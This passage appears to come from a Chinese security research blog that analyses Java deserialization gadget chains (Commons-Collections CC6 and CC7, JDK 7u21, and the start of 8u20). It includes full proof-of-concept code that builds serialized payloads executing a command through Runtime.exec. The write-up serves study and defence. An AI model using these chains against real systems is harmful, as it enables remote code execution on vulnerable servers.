InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/IINA.app\"&#125;) &#125;; Transformer[] fakeTransformer = new Transformer[]&#123;&#125;; //fake chain Transformer chain = new ChainedTransformer(fakeTransformer); HashMap innerMap = new HashMap(); //先构造假的chain Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); HashMap hashMap = new HashMap(); hashMap.put(tmap, \"test\"); //用反射再改回真的chain Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chain, transformers_exec); //清空由于 hashMap.put 对 LazyMap 造成的影响 lazyMap.clear(); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_fakechain.ser\"))); fout.writeObject(hashMap); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_fakechain.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; HashSet版PoC在HashMap的hash中，k目前还是不可控的，所以还需要找哪些函数调用了hash函数，发现HashMap自己的put方法调用了： 然而这里的key还是不可控的，所以我们要找哪里调用了put方法，发现HashSet的readObject很合适： HashSet的底层其实还是HashMap类，我们需要让HashSet的map属性为HashMap，显然可控。 最终版本PoC123456789101112131415161718192021222324252627282930313233343536373839404142434445public class HashSet_Exploit &#123; public static void main(String[] args) throws Exception&#123; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/IINA.app\"&#125;) &#125;; Transformer chain = new ChainedTransformer(transformers_exec); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,chain); TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123); HashSet hashset = new HashSet(1); hashset.add(\"0range\"); //将map属性设置为我们的tmap //1.先拿到handle Field map = Class.forName(\"java.util.HashSet\").getDeclaredField(\"map\"); map.setAccessible(true); HashMap hashset_map = (HashMap) map.get(hashset); //2.拿到map的table属性，里面应该存放entry Field table = Class.forName(\"java.util.HashMap\").getDeclaredField(\"table\"); table.setAccessible(true); Object[] array = (Object[])table.get(hashset_map); //3.将第一个entry的key设置为我们的tmap Object node = array[0]; Field key = node.getClass().getDeclaredField(\"key\"); key.setAccessible(true); key.set(node,tmap); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_HashSet.ser\"))); fout.writeObject(hashset); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_HashSet.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 既然中间用到了LazyMap，那么又可以复用，InstantiateTransformer和TemplatesImpl，PoC就不粘在这里了，可以去看我的github。 cc7条件： commons-collections:3.1-3.2.1 jdk1.7&amp;1.8 利用链寻找cc7的想法依然是寻找LazyMap.get()的触发点。 cc7的后半段和cc1的lazymap版本一样，触发点选择到了AbstractMap的equals方法来触发对LazyMap的get方法的调用： 这里如果m是可控的，那么可以设置m为LazyMap，这样就可以触发调用链的后半部分。 这里要寻找哪里调用了equals方法，ysoserial找到了HashTable的reconstitutionPut方法： 这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。 现在问题来到了，如何才能触发reconstitutionPut方法呢？ 我们发现在HashTable的readObject方法里面就调用了reconstitutionPut方法： 123456789101112131415private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException&#123; s.defaultReadObject(); int origlength = s.readInt(); int elements = s.readInt();//elements hashtable中的元素个数 .... for (; elements &gt; 0; elements--) &#123;//通过elements的长度读取键值对 K key = (K)s.readObject(); V value = (V)s.readObject(); reconstitutionPut(table, key, value);//该函数会对元素进行比较 &#125; this.table = newTable;&#125; 再看reconstitutionPut方法： 123456789101112131415161718private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value) throws StreamCorruptedException&#123; if (value == null) &#123; throw new java.io.StreamCorruptedException(); &#125; int hash = hash(key);//计算key的hash int index = (hash &amp; 0x7FFFFFFF) % tab.length;//通过hash确定索引 for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // 如果没有相同元素，创建元素到hashtable中 Entry&lt;K,V&gt; e = tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++;&#125; 现在我们跟着reconstitutionPut走，reconstitutionPut方法有三个参数： table，key，value(后面这两个是流操作，看过writeObject就知道是hashtable自己的key和value属性) 跟进去reconstitutionPut： 我们当然希望走的是AbstractMap类的equals方法，并且保证参数key是LazyMap类型，这样就可以走上LazyMap.get这条熟悉的道路了。 AbstractMap类是一个抽象类，他实现了Map接口中的equals方法。 HashMap是AbsrtactMap的实现类，他没有重写equals方法，所以如果是HashMap#equals方法，其实走的是AbstractMap的equals方法。 也就是说，如果e.key是HashMap，参数(key)是LazyMap，是可以走得通的。 但是怎么才能走到这个判断呢，需要先保证前半部分e.hash == hash，其实在String.equals()方法中存在hash碰撞。 123String a = \"yy\";String b = \"zZ\";a.hashcode() == b.hashcode();//true 大家不要忘了，要想走到这里，最外层还有一个e!=null条件。 tab就是table属性，table是Hashtable用来存放entry的数组，初始状态就算有长度也是null占位。 所以我们要像进入if，需要e!=null成立。 需要先有一个lazymap进来，将table属性赋值、还有将hash值改成自己的参数，等后续第二个进来的lazymap再触发。 第二个进来的lazymap，才会符合e不为空，将自己的hash和e.hash比较。（用yy和zZ绕过） 进入e.key.equals(key)，e.key就是第一次进来的lazymap，参数key就是第二次进来的lazymap的innermap。 还有个细节，在第二次进入后，会进入lazymap2.equals(innermap2) equals方法属于HashMap的父类AbstractMap，对于这部分来说， LazyMap继承了AbstractMapDecorator的map属性，是Map接口，所以当构造函数的参数是HashMap类型，自然就是LazyMap的map属性自然就是HashMap类型了。 但是HashMap并没有equals方法，实际上走的是父类AbstractMap#equals方法： 最终版本PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class HashTable_Exploit &#123; public static void main(String[] args) throws Exception&#123; Transformer[] fakeTransformer = new Transformer[]&#123;&#125;; Transformer[] transformers_exec = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;\"getRuntime\",null&#125;), new InvokerTransformer(\"invoke\",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(\"exec\",new Class[]&#123;String.class&#125;,new Object[]&#123;\"open /Applications/IINA.app\"&#125;) &#125;; //先用一个假的chain占位置，稍后反射改回来 //这里还是为了能够避开lazymap.put提前RCE Transformer fakeChain = new ChainedTransformer(fakeTransformer); //LazyMap实例 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); //创建两个lazymap实例 Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain); lazyMap1.put(\"yy\", 1); Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain); lazyMap2.put(\"zZ\", 1); Hashtable hashTable = new Hashtable(); hashTable.put(lazyMap1, \"0range\"); hashTable.put(lazyMap2, \"0range\"); //通过反射设置真的 chain 数组 Field field = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(fakeChain, transformers_exec); lazyMap2.remove(\"yy\"); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser\"))); fout.writeObject(hashTable); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 为什么需要remove掉第二次的lazymap？ 因为Hashtable的put方法里面也调用了equals方法： 会导致LazyMap2中右增加了(“yy“，”yy“)这个键值对，会影响当前lazymap2的size不再是1，而是2 导致在第二次进入的时候倒在了size的判断上。 当然既然还是扯到LazyMap，当然可以复用之前的InstantiateTransformer， 具体可以看我的github。 CC链总结五大反序列化利用基类： 1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。 2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。 3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。 4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。 5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。 四大Transformer的transform： 1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。 2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置） 3.ConstantTransformer：返回成员变量iConstant的值。 4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入） 三大Map： 1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。 2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。 3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。 7u21条件： jdk&lt;=7u21 这是一条十分有个性的链，因为它仅依赖jre，不依赖任何第三方库。 先说个小tip：神奇的f5a5a608 1System.out.println(\"f5a5a608\".hashCode()); == 0 利用链构造用到了AnnotationInvocationHandler作为动态代理来触发cc2里面的TemplatesImpl携带恶意_bytecode，执行静态代码块加载。 前情回顾： TemplatesImpl 类可被序列化，并且其内部名为 _bytecodes 的成员可以用来存储某个 class 的字节数据 通过 TemplatesImpl 类的 getOutputProperties 方法 / newTransformer方法 ，可以最终导致 _bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法/静态代码块中的代码被执行。 光有链还是不够的，需要找个readObject的承接点，让这条链和反序列化入口点连接起来 7u21选择的入口点是LinkedHashSet的readObject方法，实际上是父类HashSet的readObject方法： 这里面的e就是反序列化后的对象。 为什么选择HashMap呢？是因为它有个神奇的equals方法 开启支线任务： 这里先进入AnnotationInvocationHandler的invoke方法看看： 这里如果调用的方法名称是equals，并且参数个数和类型匹配，就会进入equalsImpl方法 看一看equalsImpl方法： 到这里，梳理一下： 我们就在jdk里面找到了一个原生类AnnotationInvocationHandler，他可以充当动态代理，他的invoke方法会调用了本身的equalsImpl方法，在equalsImpl内部又会调用自身memberValues属性的get方法。 之前我们是将this.mamberValues赋值为LazyMap，但是现在我们需要找到一个jdk原生类。 发现下面还有一个invoke方法 ysoserial的思路肯定也是盯着哪些类有equals方法，我们的动态代理只要在之后去invoke这个equals方法就可以了。 世界线收束： 在我们之前发现的HashMap的put方法中，就会调用key的equals方法。 能到这里需要的条件： e.hash == hash e.key == key 首先会调用内部 hash() 函数计算 key 的 hash 值，然后遍历所有元素，*当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *，则认为 key 是否已经存在，返回 oldValue，否则调用 addEntry() 添加元素。 这里核心关键点就是让key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用InvokcationHandler对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。 这里有几个细节： 首先需要保证我们传入携带动态代理的key之前，map里面就已经有一个entry了，才能保证e不为null，进入循环 第一个entry应该为Templates对象 为了保证有有序添加，所以我们才用LinkedHashSet 这里先看一下限制条件： e.hash == hash 这个需要保证的是两个hash值相等，hash值就是hash()值相等 想到我们之前的提到的神奇的f5a5a608，它的hashcode()==0 看一下hash()源码： 这里其实结果只受k.hashcode()的影响。 对于普通的obj来说，这里k就是本身 对于一个代理类来说，统一调用invoke方法。如果当前的k是AnnotationInvocationHandler类，那么调用的就是AnnotationInvocationHandler类内部的hashCodeImpl()方法 跟进memberValueHashCode方法再看看： 改写一下就是： 1( 127 * key.hashCode() ) ^ value.hashCode() 两个hash： TemplatesImpl实例.hashCode() ( 127 * key.hashCode() ) ^ TemplatesImpl实例.hashCode() 我们希望key就是f5a5a608，这样的话返回值就是TemplatesImpl实例.hashCode()了，就可以绕过e.hash == hash的check了。 细节： 可以看到hashCodeImpl()内部是有一个循环的，为了让最后的结果和value.hashCode()相同，我们希望memberValues只有一个entry，再put一个相同的key就行了，为了让tmpl和第一次的一样。 我们这里只需要让memberValue这个属性里面存放一个HashMap就行了，这个map的key是f5a5a608，value是包含恶意字节码的TemplatesImpl对象就行了 最终PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556public class Exploit &#123; public static void main(String[] args) throws Exception&#123; //1.先创建恶意类 ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass tempExploitClass = pool.makeClass(\"3xpl01t\"); //一定要设置父类，为了后续顺利 tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName())); //写入payload，生成字节数组 String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /Applications/IINA.app\\\");\"; tempExploitClass.makeClassInitializer().insertBefore(cmd); byte[] exploitBytes = tempExploitClass.toBytecode(); //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件 TemplatesImpl tmpl = new TemplatesImpl(); //设置_bytecodes属性为exploitBytes Field bytecodes = TemplatesImpl.class.getDeclaredField(\"_bytecodes\"); bytecodes.setAccessible(true); bytecodes.set(tmpl, new byte[][]&#123;exploitBytes&#125;); //一定要设置_name不为空 Field _name = TemplatesImpl.class.getDeclaredField(\"_name\"); _name.setAccessible(true); _name.set(tmpl, \"0range\"); //_class为空 Field _class = TemplatesImpl.class.getDeclaredField(\"_class\"); _class.setAccessible(true); _class.set(tmpl, null); //整个map,容量为2 Map map = new HashMap(2); String magicStr = \"f5a5a608\"; // 放入实际的 value map.put(magicStr, tmpl); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class); cons.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates.class, map); Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler); HashSet target = new LinkedHashSet(); target.add(tmpl); target.add(proxy); //payload序列化写入文件，模拟网络传输 ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_jdk7u21.ser\"))); fout.writeObject(target); //服务端读取文件，反序列化，模拟网络传输 ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(\"user.dir\")+\"/src/main/resources/Payload_jdk7u21.ser\"))); //服务端反序列化，触发漏洞 fin.readObject(); &#125;&#125; 8u20环境： jdk &lt;= 8u20 在说8u20之前，说一下7u21的修复： 可以看到，AnnotationInvocationHandler的readObject方法把this.type属性限制了只能是注解，所以我们7u21用的是Templates.class，是为了后续的TemplatesImpl的instanceof的检查可以通过。 在8u20中使用BeanContextSupport类对这个修补方式进行了绕过。 基础知识补充-序列化整个例子 在ObjectOutputStream位置下个断点 跟进去看，构造函数就做了很多事情，会来到writeStreamHeader方法： 写入了aced0005 接下来看下out.writeObject(object)是怎么写入数据的？ 会先解析class结构，判断是否实现了Serializable接口，是的话执行writeOrdinaryObject方法 看下图，首先写入TC_OBJECT,常量TC_OBJECT的值是(byte)0x73，之后调用writeClassDesc方法写入类描述符，然后会调用到writeNonProxyDesc方法 进入writeNonProxyDesc方法， 写入TC_CLASSDESC的值是0x72，然后进入writeNonProxy方法 跟进去看看getSerialVersionID是做什么的，看下图可以发现，默认获取对象的serialVersionUID值，如果对象serialVersionUID的值为空则会计算出一个serialVersionUID的值 返回writeNonProxy方法看看之后做了什么事情： 回到writeNonProxyDesc方法 可以看到在对当前对象的序列化之后，进行了对父类对象的序列化，写入父类的class结构信息。 到这里子类和父类的class都写完了。 接下来回到代码，接下来会进入writeSerialData写入对象的属性值。 进入可以看到slots存放的是对象数组，先是父类，然后才是子类对象： 这里梳理一下流程： 123序列化类结构信息： 子类 - &gt; 父类 序列化对象信息： 父类 - &gt; 子类 利用链构造这里我们先看一下8u20下AnnotationInvocationHandler类的readObject方法 两步骤： 先执行var1.defaultReadObject()来还原对象，从流里还原对象 检查this.type进行了是否为注解类，如果不是的话就报错 注意AnnotationInvocationHandler 这个对象是先被成功还原，然后再抛出的异常。绕过就是利用了这一点。 这里compare一下jdk7u21的修复方式： 1234567891011121314151617// 改之前AnnotationType annotationType = null;try &#123; annotationType = AnnotationType.getInstance(type);&#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return;&#125;// 改之后AnnotationType annotationType = null;try &#123; annotationType = AnnotationType.getInstance(type);&#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");&#125; 注意AnnotationInvocationHandler 这个对象是先被成功还原，然后再抛出的异常。 readObject &amp; defaultReadObject这里简单提一下这两个序列化流程中的重点函数： defaultReadObject 用来执行默认的反序列化流程。简单来说就是将非静态、非transient修饰的代码进行反序列化。 readObject 如果对象自己实现了readObject方法，那么就会执行对象自身的readObject方法。 参考这篇 根据 oracle 官方定义的 Java 中可序列化对象流的原则: 如果一个类中定义了readObject方法，那么这个方法将会取代默认序列化机制中的方法读取对象的状态， 可选的信息可依靠这些方法读取，而必选数据部分要依赖defaultReadObject方法读取； 我们看AnnotationInvocationHandler的readObject方法。 第一行就调用了defaultReadObject方法，该方法主要就是从字节流中读取对象的字段值，它可以从字节流中按照定义对象的类描述符以及定义的顺序读取字段的名称和类型信息。这些值会通过匹配当前类的字段名称的方式来赋予，如果当前这个对象中的某个字段并没有在字节流中出现，则这些字段会使用类中定义的默认值。 如果这个值出现在字节流中，但是并不属于对象，则抛弃该值。 如果这个值是一个对象的话，那么会为这个值分配一个Handle 在利用defaultReadObject()还原了一部分对象的值后，最近进行AnnotationType.getInstance(type)判断，如果传入的 type 不是AnnotationType类型，那么抛出异常。 也就是说，实际上在jdk7u21漏洞中，我们传入的AnnotationInvocationHandler对象在异常被抛出前，已经从序列化数据中被还原出来。换句话说就是我们把恶意的种子种到了运行对象中，但是因为出现异常导致该种子没法生长，只要我们解决了这个异常，那么就可以重新达到我们的目的。 这也就是jdk8u20漏洞的原理——绕过异常。 有趣的Try &amp; Catch &amp; Throw总结panda师傅的实验： 假设a方法有try-catch-throw，b方法只有try-catch: 以下 -&gt;表示调用 分类讨论： 如果a -&gt;b，如果b中出现异常，由于没有throw，并不会影响a后续的执行流程。 如果b-&gt;a，如果a中出现异常，a会将异常throw给上一级的b，被b方法catch住，b方法中断，b后续就不会再继续执行了。 什么是反序列化句柄HandleHandle值是每一个对象自身的一个字段。 在序列化数据中，存在的对象有null、new objects、classes、arrays、strings、back references等，这些对象在序列化结构中都有对应的描述信息，并且每一个写入字节流的对象都会被赋予引用Handle，并且这个引用Handle可以反向引用该对象（使用TC_REFERENCE结构，引用前面handle的值），引用Handle会从0x7E0000开始进行顺序赋值并且自动自增，一旦字节流发生了重置则该引用Handle会重新从0x7E0000开始。 如果你连续两次序列化同一个对象，那么第二次序列化写入的就是第一个对象的handle。 可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。 在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject： 第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。 第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。 在反序列化流程梳理这篇，在最开始的switch-case时候，如果是一个TC_REFERENCE，调用的是readHandle： 12case TC_REFERENCE: return readHandle(unshared); 跟进去看readHandle: 1234567891011121314151617181920212223242526272829/** * Reads in object handle, sets passHandle to the read handle, and returns * object associated with the handle. */private Object readHandle(boolean unshared) throws IOException &#123; if (bin.readByte() != TC_REFERENCE) &#123; throw new InternalError(); &#125; passHandle = bin.readInt() - baseWireHandle; if (passHandle &lt; 0 || passHandle &gt;= handles.size()) &#123; throw new StreamCorruptedException( String.format(\"invalid handle value: %08X\", passHandle + baseWireHandle)); &#125; if (unshared) &#123; // REMIND: what type of exception to throw here? throw new InvalidObjectException( \"cannot read back reference as unshared\"); &#125; Object obj = handles.lookupObject(passHandle); if (obj == unsharedMarker) &#123; // REMIND: what type of exception to throw here? throw new InvalidObjectException( \"cannot read back reference to unshared object\"); &#125; filterCheck(null, -1); // just a check for number of references, depth, no class return obj;&#125; 这方法首先读取TC_REFERENCE字段，接下来把读取的Handle的值传递个passHandle变量 来到Object obj = handles.lookupObject(passHandle); 跟进去看源码： 12345678910/** * Looks up and returns object associated with the given handle. * Returns null if the given handle is NULL_HANDLE, or if it has an * associated ClassNotFoundException. */Object lookupObject(int handle) &#123; return (handle != NULL_HANDLE &amp;&amp; status[handle] != STATUS_EXCEPTION) ? entries[handle] : null;&#125; lookupObject判断如果引用的handle不为空、并且没有关联的ClassNotFoundException（status[handle] != STATUS_EXCEPTION），那么就返回给定handle的引用对象。 所以这里的逻辑就是，一旦在反序列化过程中发现有TC_REFERENCE的时候，会尝试还原引用的handle对象。 如何插入数据？思考一个问题，如果我们在序列化的过程中，再向流内写东西，会发生什么？ 做个实验： 1234567891011121314151617public class Twice implements Serializable &#123; private static final long serialVersionUID = 100L; public static int num = 0; private void writeObject(ObjectOutputStream oos)throws Exception &#123; oos.defaultWriteObject(); oos.writeObject(\"ORANGE\"); oos.writeUTF(\"This is a sentence!\"); &#125; public static void main(String[] args) throws Exception &#123; Twice t = new Twice(); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"twice1.ser\")); oos.writeObject(t); oos.close(); &#125;&#125; 看一下twice2.ser: 12345678910111213141516171819202122232425262728293031$ java -jar SerializationDumper.jar -r twice1.serSTREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 20 - 0x00 14 Value - com.fxc.serial.Twice - 0x636f6d2e6678632e73657269616c2e5477696365 serialVersionUID - 0x00 00 00 00 00 00 00 64 newHandle 0x00 7e 00 00 classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata com.fxc.serial.Twice values objectAnnotation TC_STRING - 0x74 newHandle 0x00 7e 00 02 Length - 6 - 0x00 06 Value - ORANGE - 0x4f52414e4745 TC_BLOCKDATA - 0x77 Length - 21 - 0x15 Contents - 0x00135468697320697320612073656e74656e636521 TC_ENDBLOCKDATA - 0x78 可以发现： 首先classDescFlags - 0x03 - SC_WRITE_METHOD | SC_SERIALIZABLE有注明，对象有实现writeObject方法 其次在classdata下面出现了objectAnnotation字段，两个对象 一个是我们写入的String对象“ORANGE” 第二个是一个BlockData “This is a sentence!” TC_ENDBLOCKDATA标志着对象结束 现在我们当然想在writeObject的时候就插入恶意数据 简单粗暴，一切都是二进制，我们直接手动写入一段objectAnnotation就可以了。 先看一个小例子，复盘一下panda师傅的实验。 12345678910111213141516171819202122public class AnnotationInvocationHandler implements Serializable &#123; private static final long serialVersionUID = 10L; private int zero; public AnnotationInvocationHandler(int zero) &#123; this.zero = zero; &#125; public void exec(String cmd) throws IOException &#123; Process shell = Runtime.getRuntime().exec(cmd); &#125; private void readObject(ObjectInputStream input) throws Exception &#123; input.defaultReadObject(); if(this.zero==0)&#123; try&#123; double result = 1/this.zero; &#125;catch (Exception e) &#123; throw new Exception(\"Hack !!!\"); &#125; &#125;else&#123; throw new Exception(\"your number is error!!!\"); &#125; &#125;&#125; 1234567891011public class BeanContextSupport implements Serializable &#123; private static final long serialVersionUID = 20L; private void readObject(ObjectInputStream input) throws Exception &#123; input.defaultReadObject(); try &#123; input.readObject(); &#125; catch (Exception e) &#123; return; &#125; &#125;&#125; 两个类：A有throw，B没有throw 如果我们反序列化A，肯定会报错。 因为A的readObject首先会执行input.defaultReadObject()，这句话其实的意思就是从序列化流里面取出一个对象，然后执行他的默认序列化，就是给字段赋值。 这里this其实就是AnnotationInvocationHandler对象了，当我们执行完input.defaultReadObject的时候，其实zero字段已经被赋值为0了。 所以会进入if，除数为0，引发异常，但是我们的AnnotationInvocationHandler对象已经序列化成功了。 我们看一下序列化好的payload1文件： 12345678910111213141516171819202122232425262728STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 49 - 0x00 31 Value - com.fxc.bautwentycase.AnnotationInvocationHandler - 0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572 serialVersionUID - 0x00 00 00 00 00 00 00 0a newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 1 - 0x00 01 Fields 0: Int - I - 0x49 fieldName Length - 4 - 0x00 04 Value - zero - 0x7a65726f classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata com.fxc.bautwentycase.AnnotationInvocationHandler values zero (int)0 - 0x00 00 00 00 我们要知道为什么7u21修复之后就失效了？ 是因为在catch块中，修复前没有throw，修复之后多了throw！！！！ 也就是说，修复之后，异常被throw，进程被终止掉，我们的反序列化对象也被销毁掉，导致反序列化失败。 1234567891011121314151617// 改之前AnnotationType annotationType = null;try &#123; annotationType = AnnotationType.getInstance(type);&#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return;&#125;// 改之后AnnotationType annotationType = null;try &#123; annotationType = AnnotationType.getInstance(type);&#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");&#125; 我们希望的是就算有异常，不要有throw，catch就好了，这样可以保证我们的反序列化对象还是存在的。 所以来到上一个小实验，如果我们希望绕过if(this.zero==0){这个判断： 12345678910111213141516171819202122public class AnnotationInvocationHandler implements Serializable &#123; private static final long serialVersionUID = 10L; private int zero; public AnnotationInvocationHandler(int zero) &#123; this.zero = zero; &#125; public void exec(String cmd) throws IOException &#123; Process shell = Runtime.getRuntime().exec(cmd); &#125; private void readObject(ObjectInputStream input) throws Exception &#123; input.defaultReadObject(); if(this.zero==0)&#123; try&#123; double result = 1/this.zero; &#125;catch (Exception e) &#123; throw new Exception(\"Hack !!!\"); &#125; &#125;else&#123; throw new Exception(\"your number is error!!!\"); &#125; &#125;&#125; 现在换一个思路，A类的readObject一定会throw一个异常，我们能做的就是希望这个exception不要影响我们对象的序列化进程。 想到之前的分析： 我们可以在A的throw外面再套一个try-catch： 也就是说，你A可以随便throw Exception，我只要外面catch住就可以了，进程不受影响。 这也是为什么B类存在的原因。 重点看B： 1234567891011public class BeanContextSupport implements Serializable &#123; private static final long serialVersionUID = 20L; private void readObject(ObjectInputStream input) throws Exception &#123; input.defaultReadObject(); try &#123; input.readObject(); &#125; catch (Exception e) &#123; return; &#125; &#125;&#125; B的特点就是在本身的readObject里面又调用了下一个流中对象的readObject 梳理一下，我们现在需要的是==把A序列化好的hex插入到B中== 这样B在反序列化的时候： input.defaultReadObject(); 反序列化出来的是B自身对象 input.readObject反序列化出来的就是A的对象，会报错，但是会被B catch 住，==不影响反序列化对象在内存中的存在== 所以A的序列化文件： 12345678910111213141516171819202122232425262728STREAM_MAGIC - 0xac edSTREAM_VERSION - 0x00 05Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 49 - 0x00 31 Value - com.fxc.bautwentycase.AnnotationInvocationHandler - 0x636f6d2e6678632e6261757477656e7479636173652e416e6e6f746174696f6e496e766f636174696f6e48616e646c6572 serialVersionUID - 0x00 00 00 00 00 00 00 0a newHandle 0x00 7e 00 00 classDescFlags - 0x02 - 